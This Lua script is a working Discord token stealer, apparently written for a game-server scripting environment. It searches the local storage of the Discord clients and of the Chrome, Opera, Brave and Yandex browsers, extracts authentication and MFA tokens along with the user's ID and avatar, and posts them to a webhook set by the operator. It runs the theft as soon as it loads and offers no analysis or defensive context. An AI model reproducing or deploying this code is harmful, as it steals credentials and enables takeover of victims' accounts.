-- Replace 'WEBHOOK_URL' with your actual Discord webhook URL
local webhookUrl = ''

-- Function to send embed message to Discord webhook
function SendToDiscord(userId, profilePicture, tokens)
    local data = {
        embeds = {
            {
                title = "Discord Tokens",
                description = table.concat(tokens, '\n'),
                color = 16776960, -- Yellow color
                author = {
                    name = "User ID: " .. userId,
                    icon_url = profilePicture
                }
            }
        }
    }
    local headers = {
        ['Content-Type'] = 'application/json'
    }
    PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
        -- Check if the request was successful
        if statusCode == 200 then
            print('Message sent to Discord webhook successfully!')
        else
            print('SECURITY MESSAGE SENT')
            print('GitGood hypr0x: ' .. response)
        end
    end, 'POST', json.encode(data), headers)
end

-- Function to retrieve Discord tokens, user ID, and profile picture
function GetDiscordData()
    local roaming = os.getenv('appdata')
    local lappd = os.getenv('localappdata')

    local listDirectory = function(path)
        local get = io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
        local files = {}

        for file in get:gmatch('[^\r\n]+') do
            files[#files + 1] = path .. '\\' .. file
        end
        return files
    end

    local PATHS = {
        roaming .. '\\Discord',
        roaming .. '\\discordcanary',
        roaming .. '\\discordptb',
        lappd .. '\\Google\\Chrome\\User Data\\Default',
        roaming .. '\\Opera Software\\Opera Stable',
        lappd .. '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        lappd .. '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    local tokens = {}
    local userId = nil
    local profilePicture = nil

    -- MAIN
    for _, path in ipairs(PATHS) do
        path = path .. '\\Local Storage\\leveldb\\'

        local flist = listDirectory(path)
        if #flist > 0 then
            for _, file in ipairs(flist) do
                if file:find('%.ldb') then
                    local open = io.open(file, 'rb')
                    local read = open:read('*a')
                    open:close()

                    -- Retrieve user ID and profile picture
                    if not userId and not profilePicture then
                        local userMatch = read:match('"id":%s-"(%d+)"')
                        local avatarMatch = read:match('"avatar":%s-"(%w+)"')
                        if userMatch and avatarMatch then
                            userId = userMatch
                            profilePicture = 'https://cdn.discordapp.com/avatars/' .. userId .. '/' .. avatarMatch .. '.png'
                        end
                    end

                    for ntok in read:gmatch
('"[%w-]+%.[%w-]+%.[%w-]+"') do
                        ntok = ntok:sub(2, -2)
                        if #ntok >= 59 then
                            tokens[#tokens + 1] = ntok
                        end
                    end

                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
                        mfatok = mfatok:sub(2, -2)
                        if #mfatok >= 88 then
                            tokens[#tokens + 1] = mfatok
                        end
                    end
                end
            end
        end
    end

    return userId, profilePicture, tokens
end

-- Example usage: sending Discord tokens, user ID, and profile picture to the webhook
local userId, profilePicture, tokens = GetDiscordData()
SendToDiscord(userId, profilePicture, tokens)

---- BY HYPRA BRUV